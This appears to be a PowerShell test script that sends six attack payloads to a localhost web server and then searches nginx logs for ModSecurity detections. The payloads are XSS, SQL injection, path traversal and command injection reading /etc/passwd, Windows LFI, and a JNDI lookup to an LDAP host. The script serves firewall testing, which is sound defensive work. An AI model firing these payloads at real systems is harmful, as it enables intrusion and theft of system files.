Param(
    [switch]$LogsOnly
)

$ErrorActionPreference = "Stop"

$tests = @(
    @{ Name = "XSS"; Url = "https://localhost/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" },
    @{ Name = "SQLi"; Url = "https://localhost/api/v1/search/articles?q=%27%20OR%201%3D1%20--" },
    @{ Name = "PathTraversal"; Url = "https://localhost/?file=../../etc/passwd" },
    @{ Name = "CommandInjection"; Url = "https://localhost/?cmd=cat%20/etc/passwd;id" },
    @{ Name = "LFI"; Url = "https://localhost/?page=..%2F..%2F..%2Fwindows%2Fwin.ini" },
    @{ Name = "JNDI"; Url = "https://localhost/?q=%24%7Bjndi%3Aldap%3A%2F%2Fexample.com%2Fa%7D" }
)

if (-not $LogsOnly) {
    foreach ($test in $tests) {
        Write-Host ("Testing {0}..." -f $test.Name)
        & curl.exe -s -k -o NUL -w "HTTP %{http_code}\n" $test.Url
    }
}

Write-Host "\nRecent ModSecurity events (nginx logs):"
docker compose logs -n 300 nginx | Select-String -Pattern "ModSecurity|ruleId|XSS|SQLi|anomaly|Traversal|Injection"
